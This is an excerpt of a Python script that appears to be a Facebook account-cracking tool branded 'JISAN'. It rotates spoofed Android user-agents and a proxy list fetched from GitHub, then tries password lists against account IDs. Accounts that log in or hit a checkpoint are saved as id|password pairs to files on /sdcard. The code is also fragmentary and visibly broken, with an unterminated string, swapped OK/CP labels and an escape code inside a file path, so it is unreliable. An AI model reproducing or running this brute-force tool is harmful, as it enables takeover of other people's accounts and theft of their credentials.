...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/JISAN69/.JISAN-proxy.txt').text
...
for xd in range(3000):
	...
	ugent1 = f"Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
	ugent2 = f"Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36"
	ugent3 = f"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36"
	memekk = random.choice([ugent1, ugent2, ugent3])
	ugen.append(memekk)
	
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36; '
...
syed =[
'Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36'
...
\033[0;93m██    ██    ███████      █████  ██ ███████ ██   ██ ██   ████ 
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : HAMIM UDDIN JISAN
\033[97;1m>>     Facebook : It'z Jisan Xhowdhury 
\033[97;1m>>     Version  : 1.1
\033[97;1m>>     Git hop  : X1X4D-2-0
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> X1X4D-2-0  VERSION :\x1b[1;92m 1.2 ')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[JISAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[JISAN-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/JISAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in JISAN:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[JISAN-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/JISAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[JISAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[JISAN-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[JISAN-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/JISAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mJISAN\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
            ...
            "user-agent": 'Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36;}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[JISAN-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[JISAN-OK] '+uid+' | '+ps+'\33[0;97m')
